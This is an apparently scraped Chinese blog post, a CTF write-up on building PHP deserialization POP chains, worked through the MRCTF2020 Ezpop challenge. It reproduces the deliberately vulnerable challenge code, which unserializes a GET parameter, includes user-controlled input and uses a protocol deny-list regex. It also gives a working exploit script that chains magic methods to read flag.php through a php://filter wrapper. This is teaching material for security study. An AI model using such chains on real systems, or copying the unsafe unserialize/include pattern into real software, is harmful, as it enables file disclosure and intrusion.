{"blogid": "123988229", "writerAge": "码龄1年", "writerBlogNum": "45", "writerCollect": "34", "writerComment": "19", "writerFan": "15", "writerGrade": "3级", "writerIntegral": "554", "writerName": "XiLitter", "writerProfileAdress": "writer_image\\profile_123988229.jpg", "writerRankTotal": "31926", "writerRankWeekly": "23012", "writerThumb": "62", "writerVisitNum": "30539", "blog_read_count": "4101", "blog_time": "于 2022-04-06 15:49:07 发布", "blog_title": "php反序列化之pop链构造", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<h1>前言</h1>\n<p>随着对反序列化学习的不断深入，我们来学习一下pop链的构造。这个pop链对于我这种小白来说还是比较难理解的，再次写下这篇文章总结一下，加深自己对构造pop链的理解。同时也是提供想要入坑的小伙伴们一些理解。</p>\n<h1>pop链构造</h1>\n<p>一般的反序列化题目，存在漏洞或者能注入恶意代码的地方在魔术方法中，我们可以通过自动调用魔术方法来达到攻击效果。但是当注入点存在普通的类方法中，通过前面自动调用的方法就失效了，所以我们需要找到普通类与魔术方法之间的联系，理出一种逻辑思路，通过这种逻辑思路来构造一条pop链，从而达到攻击的目的。所以我们在做这类pop题目一定要紧盯魔术方法。</p>\n<h2>pop链简介</h2>\n<p>它是一种面向属性编程，常用于构造调用链的方法。在题目中的代码里找到一系列能调用的指令，并将这些指令整合成一条有逻辑的能达到恶意攻击效果的代码，就是pop链（个人理解，欢迎师傅们提出意见）在构造pop链中，魔术方法必不可少。下面将通过一个例题来说pop链是怎么构造的，以及具体构造的思路。</p>\n<h2>[MRCTF2020]Ezpop1</h2>\n<p>上题目代码：</p>\n<pre><code class=\"language-php\">Welcome to index.php\n&lt;?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\n    protected  $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this-&gt;append($this-&gt;var);\n    }\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this-&gt;source = $file;\n        echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\";\n    }\n    public function __toString(){\n        return $this-&gt;str-&gt;source;\n    }\n\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) {\n            echo \"hacker\";\n            $this-&gt;source = \"index.php\";\n        }\n    }\n}\n\nclass Test{\n    public $p;\n    public function __construct(){\n        $this-&gt;p = array();\n    }\n\n    public function __get($key){\n        $function = $this-&gt;p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n} </code></pre>\n<h3>构造思路</h3>\n<p>在构造调用链时，先找到调用链的头和尾。头一般都是能传参以及可以反序列化的地方，而尾部一般都是可以执行恶意代码的地方。审计这个题的代码，头是用get方式对pop传参，而尾部是include包含函数。到这里，我们应该都知道是要用php伪协议读取flag文件的源码。既然头和尾都找到了，也知道了攻击方法。那么接下来找到题目中的魔术方法。</p>\n<pre><code>__invoke()    当一个类被当作函数执行时调用此方法。\n\n__construct   在创建对象时调用此方法\n\n__toString()  在一个类被当作字符串处理时调用此方法\n\n__wakeup()    当反序列化恢复成对象时调用此方法\n\n__get()       当读取不可访问或不存在的属性的值会被调用</code></pre>\n<p>题中一共有这五种魔术方法。接着找出普通类与魔术方法之间的联系。</p>\n<p>不难看出wakeup函数中有个preg_match函数，用于查找source中敏感的字符串，我们可以从这里开头，将source赋予一个show类，那么会自动触发toString函数，那么现在就要在tostring方法中延申链子，那么我们可以在totring方法中$this-&gt;str赋予test类，在test类读取source变量，（因为test类中没有source属性，则是访问了不可访问的属性）则会自动调用get魔术方法。可以发现get方法中有个函数调用，则我们可以将$this-&gt;p赋予Modifier类，会自动调用invoke方法，从而执行我们写入的php伪协议（将Modifer类中的var属性赋值为我们的恶意代码）</p>\n<p>至此，我们构造pop链。</p>\n<h3>pop链讲解</h3>\n<pre><code class=\"language-php\">&lt;?php\nclass Modifier {\n\tprotected $var='php://filter/read=convert.base64-encode/resource=flag.php';\n}\nclass Show{\n\tpublic $source;\n\tpublic $str;\n\tfunction _construct(){\n\t\t$this-&gt;source=$file;\n\t}\n}\nclass Test{\n\tpublic $p;\n}\n$a = new show();\n$b = new show();\n$c = new test();\n$d = new Modifier();\n$a-&gt;source=$b;\n$b-&gt;str=$c;\n$c-&gt;p= $d;\necho urlencode(serialize($a));\n?&gt;</code></pre>\n<p>先把用到的类写出来，形成一个框架，再表明类中的变量。分别将用到的类进行实例化，这里为什么要new 两次show（看代码应该能看懂，第一次是实例化show类,第二次是将第一次实例化后的show类中的source=第二次实例化的show）</p>\n<p>在我们进行序列化的时候尽量用url编码一下（在这个题中有protected修饰的属性，会有不可见字符）</p>\n<h1>总结</h1>\n<p>构造pop链是一个逻辑性比较强的题目，我们需要不断的刷题，总结经验和提高自己的逻辑性。</p>\n<p>希望我的文章能解答一些小师傅的疑惑。</p>\n</div>\n</div>"}